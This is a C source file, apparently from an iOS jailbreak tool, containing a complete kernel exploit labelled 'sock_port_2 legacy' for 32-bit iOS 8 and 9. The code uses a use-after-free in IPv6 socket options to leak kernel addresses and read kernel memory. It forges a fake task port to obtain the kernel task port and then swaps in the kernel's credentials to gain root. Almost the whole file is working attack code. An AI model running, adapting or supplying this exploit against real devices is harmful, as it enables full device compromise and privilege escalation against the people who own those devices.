#include <mach/mach.h>
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <stddef.h>
#include <assert.h>
#include <pthread.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <unistd.h>
#include "../IOKit/IOKitLib.h"

#include "plog.h"
#include "sockpuppet.h"
#include "common.h"
#include "io.h"
#include "kernel.h"
#include "offsets.h"

static inline uint32_t mach_port_waitq_flags(void)
{
    union waitq_flags waitq_flags = {};
    waitq_flags.waitq_type              = WQT_QUEUE;
    waitq_flags.waitq_fifo              = 1;
    waitq_flags.waitq_prepost           = 0;
    waitq_flags.waitq_irq               = 0;
    waitq_flags.waitq_isvalid           = 1;
    waitq_flags.waitq_turnstile_or_port = 1;
    return waitq_flags.flags;
}

static int setMinMtu(int socket, int *minmtu)
{
    return setsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, sizeof(*minmtu));
}

static int getMinMtu(int socket, int *minmtu)
{
    socklen_t size = sizeof(*minmtu);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_USE_MIN_MTU, minmtu, &size);
}

static int getPktInfo(int socket, struct in6_pktinfo *pktinfo)
{
    socklen_t size = sizeof(*pktinfo);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, &size);
}

static int setPktInfo(int socket, struct in6_pktinfo *pktinfo)
{
    return setsockopt(socket, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, sizeof(*pktinfo));
}

static int getPreferTempAddr(int socket, int *prefertempaddr)
{
    socklen_t size = sizeof(*prefertempaddr);
    return getsockopt(socket, IPPROTO_IPV6, IPV6_PREFER_TEMPADDR, prefertempaddr, &size);
}

static int get_socket(void)
{
    int sock = socket(AF_INET6, SOCK_STREAM, IPPROTO_TCP);
    if (sock < 0)
    {
        ERR("failed to create a socket");
        return -1;
    }
    
    // allow setsockopt() after disconnect()
    struct so_np_extensions sonpx = {.npx_flags = SONPX_SETOPTSHUT, .npx_mask = SONPX_SETOPTSHUT};
    int ret = setsockopt(sock, SOL_SOCKET, SO_NP_EXTENSIONS, &sonpx, sizeof(sonpx));
    if (ret)
    {
        ERR("failed to set SO_NP_EXTENSIONS");
        return -1;
    }
    
    return sock;
}

static int dangle(void)
{
    int socket = get_socket();
    
    int minmtu = 0;
    setMinMtu(socket, &minmtu);
    
    disconnectx(socket, 0, 0);
    
    return socket;
}

static mach_port_t sprayPortPointer(mach_port_t target_port, int count, int disposition)
{
    mach_port_t remotePort = MACH_PORT_NULL;
    kern_return_t err;
    err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &remotePort);
    if (err != KERN_SUCCESS)
    {
        ERR("failed to allocate port");
        return MACH_PORT_NULL;
    }
    
    mach_port_t* ports = malloc(sizeof(mach_port_t) * count);
    for (int i = 0; i < count; i++)
    {
        ports[i] = target_port;
    }
    
    struct ool_msg* msg = (struct ool_msg*)calloc(1, sizeof(struct ool_msg));
    
    msg->hdr.msgh_bits = MACH_MSGH_BITS_COMPLEX | MACH_MSGH_BITS(MACH_MSG_TYPE_MAKE_SEND, 0);
    msg->hdr.msgh_size = (mach_msg_size_t)sizeof(struct ool_msg);
    msg->hdr.msgh_remote_port = remotePort;
    msg->hdr.msgh_local_port = MACH_PORT_NULL;
    msg->hdr.msgh_id = 0x41414141;
    
    msg->body.msgh_descriptor_count = 1;
    
    msg->ool_ports.address = ports;
    msg->ool_ports.count = count;
    msg->ool_ports.deallocate = 0;
    msg->ool_ports.disposition = disposition;
    msg->ool_ports.type = MACH_MSG_OOL_PORTS_DESCRIPTOR;
    msg->ool_ports.copy = MACH_MSG_PHYSICAL_COPY;
    
    err = mach_msg(&msg->hdr,
                   MACH_SEND_MSG|MACH_MSG_OPTION_NONE,
                   msg->hdr.msgh_size,
                   0,
                   MACH_PORT_NULL,
                   MACH_MSG_TIMEOUT_NONE,
                   MACH_PORT_NULL);
    
    if (err != KERN_SUCCESS)
    {
        ERR("failed to spray target port's address");
        return MACH_PORT_NULL;
    }
    
    return remotePort;
}


static int leakPortAddress(mach_port_t portname, addr_t* retval)
{
    int retry = 0;
    int socket = 0;
    
retry:
    socket = dangle();
    
    for(int i = 0; i < MAX_PORTLEAK_ATTEMPTS; i++)
    {
        mach_port_t holder = sprayPortPointer(portname, 192/sizeof(addr_t), MACH_MSG_TYPE_COPY_SEND);
        if(holder == MACH_PORT_NULL)
        {
            goto end1;
        }
        int mtu;
        int preferTempAddr;
        getMinMtu(socket, &mtu);
        getPreferTempAddr(socket, &preferTempAddr);
        
        addr_t ptr = mtu;
        if (mtu != 0xffffffff && mtu != 0 && preferTempAddr != 0xdeadbeef && mtu == preferTempAddr)
        {
            DEVLOG2("leakPortAddress: success (attempts: %d/%d, retries: %d/%d)", i, MAX_PORTLEAK_ATTEMPTS, retry, MAX_PORTLEAK_RETRY);
            mach_port_destroy(mach_task_self(), holder);
            close(socket);
            *retval = ptr;
            return 0;
        }
    end1:
        if(holder != MACH_PORT_NULL)
        {
            mach_port_destroy(mach_task_self(), holder);
        }
    }
    
    close(socket);
    retry++;
    if(retry < MAX_PORTLEAK_RETRY)
    {
        goto retry;
    }
    ERR("failed to leak port address");
    return -1;
}

// second primitive: read 20 bytes from addr
static int leak20AndFree(addr_t addr, bool do_kfree, void** retval)
{
    int sockets[128];
    for (int i = 0; i < 128; i++)
    {
        sockets[i] = dangle();
        if(sockets[i] == -1)
        {
            return -1;
        }
    }
    
    // create a fake struct with our dangling port address as its pktinfo
    struct ip6_pktopts *fakeOptions = calloc(1, sizeof(struct ip6_pktopts));
    bool found = false;
    int saved = -1;
    
    if(do_kfree)
    {
        addr += sizeof(addr_t);
    }

    *(addr_t*)((addr_t)fakeOptions + (sizeof(addr_t)*2)) = addr; // magic
    *(addr_t*)((addr_t)fakeOptions + 12) = addr; // magic
    *(addr_t*)((addr_t)fakeOptions + 120) = 0xcafebabe; // magic
    fakeOptions->ip6po_pktinfo = (struct in6_pktinfo*)addr;
    
    for(int i = 0; i < MAX_UAF_RETRY; i++)
    {
        spray_OSUnserializeXML((void*)fakeOptions, sizeof(struct ip6_pktopts));
        
        for(int j = 0; j < 128; j++)
        {
            int minmtu = -1;
            getMinMtu(sockets[j], &minmtu);
            if (minmtu == 0xcafebabe)
            {
                saved = j;
                found = true;
                DEVLOG2("leak20AndFree: found (attempts: %d/%d)", i, MAX_UAF_RETRY);
                break;
            }
        }
        if(found)
        {
            break;
        }
    }
    
    free(fakeOptions);
    
    if(!found)
    {
        ERR("leak20AndFree: failed");
        for(int i = 0; i < 128; i++)
        {
            // closing all sockets
            close(sockets[i]);
        }
        return -1;
    }
    
    for(int i = 0; i < 128; i++)
    {
        if(i != saved)
        {
            close(sockets[i]);
        }
    }
    
    void *buf = malloc(sizeof(struct in6_pktinfo));
    if(do_kfree)
    {
        memset(buf, 0, sizeof(struct in6_pktinfo));
        
        setPktInfo(sockets[saved], buf);
        free(buf);
        return 0;
    }
    
    getPktInfo(sockets[saved], (struct in6_pktinfo *)buf);
    close(sockets[saved]);
    *retval = buf;
    return 0;
}

static int earlyRead32_(addr_t addr, uint32_t* retval)
{
    void *buf = NULL;
    leak20AndFree(addr, false, &buf);
    if(buf)
    {
        uint32_t uptr = *(addr_t*)buf;
        free(buf);
        *retval = uptr;
        return 0;
    }
    return -1;
}

static int earlyRead32(addr_t addr, uint32_t* retval)
{
    int retry = 0;
    int r = 0;
    
retry_earlyread32:
    r = earlyRead32_(addr, retval);
    if(r)
    {
        if(retry > MAX_UAF_ATTEMPTS)
        {
            goto earlyread32_end;
        }
        retry++;
        usleep(10);
        goto retry_earlyread32;
    }
earlyread32_end:
    return r;
}

static int earlyRead64_(addr_t addr, uint64_t* retval)
{
    void *buf = NULL;
    leak20AndFree(addr, false, &buf);
    if(buf)
    {
        uint64_t uptr = *(addr_t*)buf;
        free(buf);
        *retval = uptr;
        return 0;
    }
    return -1;
}

static int earlyRead64(addr_t addr, uint64_t* retval)
{
    int retry = 0;
    int r = 0;
    
retry_earlyread64:
    r = earlyRead64_(addr, retval);
    if(r)
    {
        if(retry > MAX_UAF_ATTEMPTS)
        {
            goto earlyread64_end;
        }
        retry++;
        usleep(10);
        goto retry_earlyread64;
    }
earlyread64_end:
    return r;
}

static int earlyReadPtr(addr_t addr, addr_t* retval)
{
    return earlyRead32(addr, retval);
}

static mach_port_t createNewPort(void)
{
    mach_port_t port;
    kern_return_t err = mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port);
    if(err)
    {
        ERR("failed to allocate port (%s)", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    err = mach_port_insert_right(mach_task_self(), port, port, MACH_MSG_TYPE_MAKE_SEND);
    if(err)
    {
        ERR("failed to insert right (%s)", mach_error_string(err));
        return MACH_PORT_NULL;
    }
    return port;
}

static kern_return_t find_port_tfp0_sp(mach_port_t port, addr_t self_port_addr, bool cleanup, addr_t* retval)
{
    kern_return_t err = KERN_SUCCESS;
    
#define CHECK_FIND_PORT_RET(func, addr, err) {\
if(err != KERN_SUCCESS) \
{ \
ERR("%s: %s failed: %s (%s)", __FUNCTION__, #func, #addr, mach_error_string(err)); \
goto kern_fail;\
} \
}
    
    addr_t port_address = 0;
    
    addr_t task_addr = 0;
    addr_t itk_space = 0;
    addr_t is_table = 0;
    
    err = kreadptr_sp(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), &task_addr);
    CHECK_FIND_PORT_RET(kreadptr, task_addr, err);
    DEVLOG("task_addr: " ADDR, task_addr);
    
    err = kreadptr_sp(task_addr + koffset(TASK_ITK_SPACE), &itk_space);
    CHECK_FIND_PORT_RET(kreadptr, itk_space, err);
    DEVLOG("itk_space: " ADDR, itk_space);
    
    err = kreadptr_sp(itk_space + koffset(IPC_SPACE_IS_TABLE), &is_table);
    CHECK_FIND_PORT_RET(kreadptr, is_table, err);
    DEVLOG("is_table: " ADDR, is_table);
    
    uint32_t port_index = port >> 8;
    const int sizeof_ipc_entry_t = koffset(IPC_ENTRY_SIZE);
    
    if(cleanup)
    {
        err = kwrite32_sp(is_table + (port_index * sizeof_ipc_entry_t) + sizeof(addr_t), 0);
        CHECK_FIND_PORT_RET(kwrite32, is_table + _sp(port_index * sizeof_ipc_entry_t) + sizeof(addr_t), err);
        
        err = kwriteptr_sp(is_table + (port_index * sizeof_ipc_entry_t), 0);
        CHECK_FIND_PORT_RET(kwriteptr, is_table + _sp(port_index * sizeof_ipc_entry_t), err);
        return KERN_SUCCESS;
    }
    
    err = kreadptr_sp(is_table + (port_index * sizeof_ipc_entry_t), &port_address);
    CHECK_FIND_PORT_RET(kreadptr, port_address, err);
    
    *retval = port_address;
    return KERN_SUCCESS;
    
kern_fail:
    return err;
}

mach_port_t exploit(addr_t* kslide)
{
    kern_return_t err = KERN_SUCCESS;

#define CHECK_KERN_RET(func, addr, err) {\
if(err != KERN_SUCCESS) \
{ \
ERR("%s failed: %s (%s)", #func, #addr, mach_error_string(err)); \
goto fail;\
} \
}

    offsets_init();

    LOG_("exploiting sock_port_2 legacy");

    int overwrite_pipe[2];
    int fake_port_pipe[2] = {-1, -1};

    // get its kernel address
    DEVLOG("creating dummy task port");
    mach_port_t dummy_task_port = createNewPort();
    if(!dummy_task_port)
    {
        ERR("dummy task port allocation failed");
        goto fail;
    }
    DEVLOG("dummy_task_port: %d", dummy_task_port);

    // self_port_addr
    LOG_("leaking port address");
    addr_t self_port_addr = 0;
    for (int i = 0; i < MAX_PORTLEAK_ATTEMPTS; i++)
    {
        if(!leakPortAddress(mach_task_self(), &self_port_addr))
        {
            break;
        }
        usleep(100);
    }
    if(self_port_addr == 0)
    {
        ERR("failed to get port address");
        goto fail;
    }
    DEVLOG("self_port_addr: " ADDR, self_port_addr);

    addr_t tfp0_port_addr = 0;
    for (int i = 0; i < MAX_PORTLEAK_ATTEMPTS; i++)
    {
        if(!leakPortAddress(dummy_task_port, &tfp0_port_addr))
        {
            break;
        }
        usleep(100);
    }
    if(tfp0_port_addr == 0)
    {
        ERR("failed to get tfp0Kaddr");
        goto fail;
    }
    DEVLOG("dummy kernel_task_port_addr: " ADDR, tfp0_port_addr);


    // early kread with leak20 primitive

#define CHECK_EARLY_READ(val) {\
if(!val) \
{ \
ERR("failed to get %s", #val); \
goto fail;\
} \
else \
{ \
DEVLOG("%s: " ADDR, #val, val); \
} \
}

    LOG_("reading kernel memory (UaF)");
    addr_t ipc_space_kernel = 0;
    earlyReadPtr(self_port_addr + koffset(IPC_PORT_IP_RECEIVER), &ipc_space_kernel);
    CHECK_EARLY_READ(ipc_space_kernel);

    DEVLOG("creating pipe");
    err = pipe(overwrite_pipe);
    if(err)
    {
        ERR("failed to create overwrite_pipe");
        goto fail;
    }

    static const size_t pipebuf_size = 0x8000;
    size_t pipebuf_sizep = 0x10000;
    static uint8_t pipebuf[pipebuf_size];
    memset(pipebuf, 0, pipebuf_size);
    *(addr_t*)(pipebuf) = pipebuf_sizep;

    write(overwrite_pipe[1], pipebuf, pipebuf_size);
    read(overwrite_pipe[0], pipebuf, pipebuf_size);
    write(overwrite_pipe[1], pipebuf, sizeof(addr_t));

    /* There are no PAN devices on aarch64 & ios 9 */
    /* but we have still 32bit */
    err = pipe(fake_port_pipe);
    if(err)
    {
        ERR("failed to create fake_port_pipe");
        goto fail;
    }

    size_t fake_task_size = 0x208;
    size_t fake_port_size = is_ios9 ? sizeof(kport9_t) : sizeof(kport8_t);
    DEVLOG("allocating fake_port");

    kport_t *fake_port = NULL;

    fake_port = malloc(fake_port_size + fake_task_size);
    if (!fake_port) {
        ERR("failed to allocate fake_port");
        goto fail;
    }

    ktask_t *fake_task = (ktask_t *)((addr_t)fake_port + fake_port_size);
    bzero((void *)fake_port, fake_port_size + fake_task_size);

    fake_task->ref_count = 0xff;

    if (is_ios9) {
        fake_port->kport9.ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
        fake_port->kport9.ip_references = 0xf00d;
        fake_port->kport9.ip_lock.type = 0x11;
        fake_port->kport9.ip_messages.port.receiver_name = 1;
        fake_port->kport9.ip_messages.port.msgcount = 0;
        fake_port->kport9.ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
        fake_port->kport9.ip_messages.port.waitq.flags = mach_port_waitq_flags();
        fake_port->kport9.ip_srights = 99;
        fake_port->kport9.ip_kobject = 0;
        fake_port->kport9.ip_receiver = ipc_space_kernel;
    } else {
        fake_port->kport8.ip_bits = IO_BITS_ACTIVE | IKOT_TASK;
        fake_port->kport8.ip_references = 0xf00d;
        fake_port->kport8.ip_lock.type = 0x11;
        fake_port->kport8.ip_messages.port.receiver_name = 1;
        fake_port->kport8.ip_messages.port.msgcount = 0;
        fake_port->kport8.ip_messages.port.qlimit = MACH_PORT_QLIMIT_LARGE;
        fake_port->kport8.ip_messages.port.waitq.flags = mach_port_waitq_flags();
        fake_port->kport8.ip_srights = 99;
        fake_port->kport8.ip_kobject = 0;
        fake_port->kport8.ip_receiver = ipc_space_kernel;
    }

    write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size);
    read(fake_port_pipe[0], (void *)fake_port, fake_port_size + fake_task_size);

    addr_t task_addr = 0;
    addr_t proc = 0;
    addr_t fds = 0;
    addr_t ofiles = 0;
    addr_t fproc = 0;
    addr_t fglob = 0;
    addr_t fg_data = 0;
    addr_t pipe_buffer = 0;

    LOG_("reading kernel memory (UaF)");
    earlyReadPtr(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), &task_addr);
    CHECK_EARLY_READ(task_addr);

    earlyReadPtr(task_addr + koffset(TASK_BSDINFO), &proc);
    CHECK_EARLY_READ(proc);

    earlyReadPtr(proc + koffset(PROC_P_FD), &fds);
    CHECK_EARLY_READ(fds);

    earlyReadPtr(fds + koffset(FILEDESC_FD_OFILES), &ofiles);
    CHECK_EARLY_READ(ofiles);

    earlyReadPtr(ofiles + overwrite_pipe[0] * sizeof(addr_t), &fproc);
    CHECK_EARLY_READ(fproc);

    earlyReadPtr(fproc + koffset(FILEPROC_F_FGLOB), &fglob);
    CHECK_EARLY_READ(fglob);

    earlyReadPtr(fglob + koffset(FILEGLOB_FG_DATA), &fg_data);
    CHECK_EARLY_READ(fg_data);

    earlyReadPtr(fg_data + koffset(PIPE_BUFFER), &pipe_buffer);
    CHECK_EARLY_READ(pipe_buffer);

    addr_t port_fproc = 0;
    addr_t port_fglob = 0;
    addr_t port_fg_data = 0;
    addr_t fake_port_buffer = 0;

    fproc = earlyReadPtr(ofiles + fake_port_pipe[0] * sizeof(addr_t), &port_fproc);
    CHECK_EARLY_READ(port_fproc);

    earlyReadPtr(port_fproc + koffset(FILEPROC_F_FGLOB), &port_fglob);
    CHECK_EARLY_READ(port_fglob);

    earlyReadPtr(port_fglob + koffset(FILEGLOB_FG_DATA), &port_fg_data);
    CHECK_EARLY_READ(port_fg_data);

    earlyReadPtr(port_fg_data + koffset(PIPE_BUFFER), &fake_port_buffer);
    CHECK_EARLY_READ(fake_port_buffer);

    // Fix ip_kobject.
    if (is_ios9) {
        fake_port->kport9.ip_kobject = fake_port_buffer + fake_port_size;
        write(fake_port_pipe[1], (void *)&(fake_port->kport9), fake_port_size + fake_task_size);
    } else {
        fake_port->kport8.ip_kobject = fake_port_buffer + fake_port_size;
        write(fake_port_pipe[1], (void *)&(fake_port->kport8), fake_port_size + fake_task_size);
    }

    // Free the first pipe.
    int isfree = -1;
    LOG_("free the first pipe");
    for(int i = 0; i < MAX_UAF_ATTEMPTS; i++)
    {
        isfree = leak20AndFree(pipe_buffer, true, NULL);
        if(!isfree)
        {
            break;
        }
        usleep(100);
    }
    if(isfree)
    {
        ERR("kfree failed");
        goto fail;
    }

    LOG_("spraying");
    mach_port_t holder = MACH_PORT_NULL;
    addr_t leak = 0;
    for (int i = 0; i < MAX_SPRAY_ATTEMPTS; i++)
    {
        holder = sprayPortPointer(dummy_task_port, pipebuf_sizep/sizeof(addr_t), MACH_MSG_TYPE_COPY_SEND);
        if(!holder)
        {
            goto fail;
        }

        read(overwrite_pipe[0], &leak, sizeof(addr_t));
        if (leak == tfp0_port_addr)
        {
            DEVLOG("found leak (%d)", i);
            break;
        }
        write(overwrite_pipe[1], &leak, sizeof(addr_t));
        mach_port_destroy(mach_task_self(), holder);
        holder = MACH_PORT_NULL;
    }

    if (leak != tfp0_port_addr)
    {
        ERR("failed to reallocate");
        // panic
        goto fail;
    }

    if (!holder)
    {
        ERR("failed to spraying");
        goto fail;
    }

    write(overwrite_pipe[1], &fake_port_buffer, sizeof(addr_t));

    struct ool_msg *msg = malloc(0x1000);
    err = mach_msg(&msg->hdr, MACH_RCV_MSG, 0, 0x1000, holder, MACH_MSG_TIMEOUT_NONE, MACH_PORT_NULL);
    if (err)
    {
        ERR("failed to recieve send rights to fake port (%s)", mach_error_string(err));
        free(msg);
        goto fail;
    }

    mach_port_t *received_ports = msg->ool_ports.address;
    mach_port_t pipe_fake_task_port = received_ports[0]; // fake port
    free(msg);

    DEVLOG("pipe_fake_task_port: %x", pipe_fake_task_port);

    addr_t *read_addr_ptr = (addr_t *)((addr_t)fake_task + koffset(TASK_BSDINFO));

# define stage1Read32(addr, val) { \
   read(fake_port_pipe[0], (void *)fake_port, fake_port_size + fake_task_size); \
   *read_addr_ptr = addr - koffset(BSDINFO_PID); \
   write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size); \
   val = 0x0; \
   err = pid_for_task(pipe_fake_task_port, (int *)&val); \
   if(err != KERN_SUCCESS) { \
     ERR("stage 1 read failed (%s)", mach_error_string(err)); \
     goto fail; \
   } \
 }

#define stage1Read64(addr, val) {\
  uint32_t r64_tmp; \
  stage1Read32(addr + 0x4, r64_tmp);\
  stage1Read32(addr, val);\
  val = val | ((uint64_t)r64_tmp << 32); \
}

# define stage1ReadPtr(addr, val) stage1Read32(addr, val)

    LOG_("reading kernel memory (stage1)");
    addr_t struct_task;
    stage1ReadPtr(self_port_addr + koffset(IPC_PORT_IP_KOBJECT), struct_task);
    DEVLOG("struct_task: " ADDR, struct_task);

    if (struct_task != task_addr)
    {
        ERR("stage1 read failed: (%s)", "struct_task == 0");
        goto fail;
    }
    DEVLOG("stage1 read succeeded");

    // findout some offsets
    addr_t bsd_info = 0;
    addr_t kernel_task_addr = 0;
    addr_t kernel_vm_map = 0;
    uint32_t pid = 0;
    addr_t tmp_task_addr = struct_task;

    while(tmp_task_addr != 0)
    {
        stage1ReadPtr(tmp_task_addr + koffset(TASK_BSDINFO), bsd_info);
        if(!bsd_info)
        {
            ERR("stage1 read failed: (%s)", "bsd_info == 0");
            goto fail;
        }
        stage1Read32(bsd_info + koffset(BSDINFO_PID), pid);
        if (pid == 0)
        {
            stage1ReadPtr(tmp_task_addr + koffset(TASK_VM_MAP), kernel_vm_map);
            if(!kernel_vm_map)
            {
                ERR("stage1 read failed: (%s)", "kernel_vm_map == 0");
                goto fail;
            }
            kernel_task_addr = tmp_task_addr;
            break;
        }
        stage1ReadPtr(tmp_task_addr + koffset(TASK_PREV), tmp_task_addr);
    }

    DEVLOG("kernel_task_addr: " ADDR, kernel_task_addr);

    mach_port_t new_port = MACH_PORT_NULL;

    // building incomplete fake_task
    LOG_("creating incomplete fake task port");
    read(fake_port_pipe[0], (void *)fake_port, fake_port_size + fake_task_size);

    fake_task->lock.data = 0x0;
    fake_task->lock.type = 0x22;
    fake_task->ref_count = 100;
    fake_task->active = 1;
    *(addr_t*)((addr_t)fake_task + koffset(TASK_VM_MAP)) = kernel_vm_map;
    *(uint32_t*)((addr_t)fake_task + koffset(TASK_ITK_SELF)) = 1;

    write(fake_port_pipe[1], (void *)fake_port, fake_port_size + fake_task_size);

    // incomplete tfp0
    tfp0_sp = pipe_fake_task_port;

    // building 2nd incomplete fake_port
    new_port = createNewPort();
    if(!new_port)
    {
        ERR("port allocation failed");
        goto fail;
    }

    LOG_("reading kernel memory (incomplete tfp0)");
    addr_t new_port_addr = 0;
    err = find_port_tfp0_sp(new_port, self_port_addr, false, &new_port_addr);
    CHECK_KERN_RET(find_port_tfp0_sp, new_port_addr, err);
    DEVLOG("new_port_addr: " ADDR, new_port_addr);

    addr_t faketask = 0;
    err = kalloc_sp(&faketask, fake_task_size);
    CHECK_KERN_RET(kalloc_sp, faketask, err);
    DEVLOG("faketask: " ADDR, faketask);

    // copying real ktask
    err = copyin_sp(fake_task, kernel_task_addr, fake_task_size);
    CHECK_KERN_RET(copyin, fake_task, err);

    err = copyout_sp(faketask, (void*)fake_task, fake_task_size);
    CHECK_KERN_RET(copyout, fake_task, err);

    // copying fake port
    if (is_ios9) {
        fake_port->kport9.ip_kobject = faketask;
        copyout_sp(new_port_addr, (void*)&(fake_port->kport9), fake_port_size);
    } else {
        fake_port->kport8.ip_kobject = faketask;
        copyout_sp(new_port_addr, (void*)&(fake_port->kport8), fake_port_size);
    }
    CHECK_KERN_RET(copyout, fake_port, err);

    LOG_("getting real kernel_task");
    err = task_get_special_port(new_port, 1, &tfp0_sp);

    CHECK_KERN_RET(task_get_special_port, tfp0_sp, err);

    LOG_("tfp0: %x", tfp0_sp);

    DEVLOG("exploit succeeded, cleaning up");
    err = find_port_tfp0_sp(pipe_fake_task_port, self_port_addr, true, NULL);
    CHECK_KERN_RET(find_port_tfp0_sp, NULL, err);

    err = kwriteptr_sp(fg_data + koffset(PIPE_BUFFER), 0);
    CHECK_KERN_RET(kwriteptr, fg_data + koffset(PIPE_BUFFER), err);

    err = find_port_tfp0_sp(new_port, self_port_addr, true, NULL);
    CHECK_KERN_RET(find_port_tfp0_sp, NULL, err);

    if (overwrite_pipe[0] > 0)  close(overwrite_pipe[0]);
    if (overwrite_pipe[1] > 0)  close(overwrite_pipe[1]);
    if (fake_port_pipe[0] > 0)  close(fake_port_pipe[0]);
    if (fake_port_pipe[1] > 0)  close(fake_port_pipe[1]);
    if (fake_port) free((void *)fake_port);

    LOG_("cleaning up done");

    err = kfree_sp(faketask, fake_task_size);
    CHECK_KERN_RET(kfree_sp, faketask, err);

    LOG_("leaking kernel anchor");
    addr_t anchor = 0;
    if(!leak_anchor(&anchor))
    {
        DEVLOG("anchor: " ADDR, anchor);
        addr_t kernel_base = 0;
        kernel_base = (anchor & 0xFFF00000) + 0x1000;
        DEVLOG("kernel base: " ADDR, kernel_base);
        //*kslide = kernel_base - KERNEL_BASE_ADDRESS;
        //LOG_("kernel slide: " ADDR, *kslide);
        *kslide = kernel_base;
    }
    else
    {
        ERR("failed to determining kernel base");
        goto fail;
    }

    LOG_("getting root");
    addr_t kern_proc_addr = 0;
    addr_t kern_kauth_cred_addr = 0;
    addr_t our_cred_addr = 0;

    err = kreadptr_sp(kernel_task_addr + koffset(TASK_BSDINFO), &kern_proc_addr);
    CHECK_KERN_RET(kreadptr_sp, kern_proc_addr, err);

    err = kreadptr_sp(kern_proc_addr + koffset(BSDINFO_KAUTH_CRED), &kern_kauth_cred_addr);
    CHECK_KERN_RET(kreadptr_sp, kern_kauth_cred_addr, err);

    err = kreadptr_sp(proc + koffset(BSDINFO_KAUTH_CRED), &our_cred_addr);
    CHECK_KERN_RET(kreadptr_sp, our_cred_addr, err);

    addr_t myProc;
    addr_t myUcred;
    myProc = proc;
    myUcred = our_cred_addr;

    err = kwriteptr_sp(proc + koffset(BSDINFO_KAUTH_CRED), kern_kauth_cred_addr);
    CHECK_KERN_RET(kwriteptr_sp, proc + koffset(BSDINFO_KAUTH_CRED), err);

    setuid(0); // update host port, security token and whatnot
    LOG_("uid: %u", getuid());

    extern addr_t self_port_address;
    self_port_address = self_port_addr;

    LOG_("exploit done!");

    return tfp0_sp;

fail:
    ERR("exploit failed, cleaning up");
    if (overwrite_pipe[0] > 0)  close(overwrite_pipe[0]);
    if (overwrite_pipe[1] > 0)  close(overwrite_pipe[1]);
    if (fake_port_pipe[0] > 0)  close(fake_port_pipe[0]);
    if (fake_port_pipe[1] > 0)  close(fake_port_pipe[1]);
    if (fake_port) free((void *)fake_port);
    return MACH_PORT_NULL;
}
